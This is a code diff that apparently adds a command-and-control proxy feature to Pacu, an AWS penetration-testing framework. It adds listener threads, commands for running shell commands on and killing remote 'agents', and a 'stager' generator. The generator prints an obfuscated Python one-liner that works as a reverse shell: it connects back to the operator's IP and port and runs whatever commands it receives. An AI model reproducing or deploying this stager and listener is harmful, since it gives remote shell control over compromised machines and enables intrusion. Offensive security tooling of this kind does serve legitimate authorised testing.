@@ -13,6 +13,7 @@ import configure_settings
 import settings
 
 from core.models import AWSKey, PacuSession
+from pacu_proxy import PacuProxy
 from setup_database import setup_database_if_not_present
 from utils import get_database_connection, set_sigint_handler
 
@@ -321,6 +322,41 @@ class util(object):
         with the alias exists, an exception will be raised. """
         return database.query(AWSKey).filter(AWSKey.key_alias == alias).scalar()
 
+def start_proxy(database):
+    create_workers(database)
+    create_jobs()
+    return
+
+# Create the proxy threads
+def create_workers(database):
+    server = PacuProxy()
+    server.prepare_server(database)
+    for _ in range(2):
+        t = threading.Thread(target=work, args=(database,), daemon=True)
+        t.daemon = True
+        t.start()
+    return
+
+# Handle the next job in queue (one thread handles connections, other sends commands)
+def work(database):
+    server = global_config['Proxy']
+    while True:
+        x = queue.get()
+        if x == 1:
+            server.socket_create()
+            server.socket_bind()
+            server.accept_connections()
+        if x == 5:
+            break # Shutdown listener called
+    queue.task_done()
+    return global_config
+
+# Fill the queue with jobs
+def create_jobs():
+    for x in [1, 2]: # Job numbers
+        queue.put(x)
+    return
+
 
 def parse_command(command, database):
     session = PacuSession.get_active_session(database)
@@ -330,6 +366,83 @@ def parse_command(command, database):
 
     if command[0] == '':
         return
+    elif cmd[0] == 'proxy':
+        proxy_data = copy.deepcopy(session.Proxy)
+        if len(cmd) == 1: # Display proxy help
+            print("""
+    PacuProxy command info:
+        proxy                               Control PacuProxy/display help
+            start ip [port]                   Start the PacuProxy listener - port 80 by default
+            stop                                Stop the PacuProxy listener
+            kill <agent_id>                     Kill an agent (stop it from running on the host)
+            list/ls                             List info on remote agent(s)
+            use none|<agent_id>                 Use a remote agent, identified by unique integers 
+                                                  (use "proxy list" to see them). Choose "none" to
+                                                  not use any proxy (route from the local host)
+            shell <agent_id> <command>          Run a shell command on the remote agent
+            stager lin|win                      Generate a PacuProxy stager. The two formats available
+                                                  are python one-liners for Linux (lin) or Windows
+                                                  (win). The only difference in the payloads is how
+                                                  command-line escaping is done for valid syntax.
+""")
+        elif cmd[1] == 'start': # Start proxy server
+            if global_config['Proxy'] is None:
+                if len(cmd) == 4:
+                    proxy_data['Port'] = cmd[3]
+                else:
+                    proxy_data['Port'] = 80
+                proxy_data['IP'] = cmd[2]
+                print('Starting PacuProxy on {}:{}...'.format(proxy_data['IP'], proxy_data['Port']))
+                start_proxy(database)
+                session.update(database, Proxy=proxy_data)
+                return
+            else:
+                print('There already seems to be a listener running: {}'.format(global_config['Proxy']))
+        elif cmd[1] == 'list' or cmd[1] == 'ls': # List active agent connections
+            global_config['Proxy'].list_connections(database)
+        elif cmd[1] == 'shell' and len(cmd) > 3: # Run shell command on an agent  
+            global_config['Proxy'].run_cmd(int(cmd[2]), global_config['Proxy'].all_connections[int(cmd[2])], ' '.join(cmd[3:]), database)
+        elif cmd[1] == 'stop': # Stop proxy server
+            if global_config['Proxy'] is None:
+                print('There does not seem to be a listener running currently.')
+            else:
+                global_config['Proxy'].quit_gracefully(database)
+                queue.put(5)
+                global_config['Proxy'] = proxy_data['Target'] = proxy_data['IP'] = None
+        elif cmd[1] == 'kill': # Kill an agent connection
+            if len(cmd) == 3:
+                print('** Killing agent {}... **'.format(int(cmd[2])))
+                global_config['Proxy'].quit(int(cmd[2]), global_config['Proxy'].all_connections[int(cmd[2])], database)
+                print('** Agent killed **')
+            elif len(cmd) == 2:
+                print(' ** Incorrect input, excepted an agent ID, received nothing. Use format: proxy kill <agent_id> **')
+            else:
+                print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]))
+        elif cmd[1] == 'stager':
+            if len(cmd) == 3:
+                python_stager = "import os,socket as E,subprocess as B,time as t,sys,struct as D\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      t.sleep(5)\\n      raise\\n    try:\\n      self.s.send(E.gethostname().encode('ascii'))\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode('ascii')\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while True:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='Err: %s\\\n'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        sys.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=True,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='Err:%s\\\n'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while True:\\n    try:\\n      C.c()\\n    except Exception as e:\\n      t.sleep(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nsys.stderr=object\\nwhile True:\\n  f()".format(proxy_data['IP'], proxy_data['Port'])
+                if cmd[2] == 'lin': # Linux one-liner (uses \" to escape inline double-quotes)
+                    print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)))
+                elif cmd[2] == 'win': # Windows one-liner (uses `" to escape inline double-quotes)
+                    print('python3 -c "{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)))
+                else:
+                    print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]))
+            else:
+                print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]))
+        elif cmd[1] == 'use':
+            if len(cmd) == 3:
+                try:
+                    if cmd[2] == 'none':
+                        print('No longer using a remote PacuProxy agent to route commands...')
+                        proxy_data['Target'] = None
+                    else:
+                        print('Setting proxy target to agent {}...'.format(cmd[2]))
+                        proxy_data['Target'] = int(cmd[2])
+                except:
+                    print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]))
+            else:
+                print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]))
+        session.update(database, Proxy=proxy_data)
     elif (command[0] == 'run' or command[0] == 'exec') and len(command) > 1:
         exec_module(command, database)
     elif command[0] == 'list' or command[0] == 'ls':
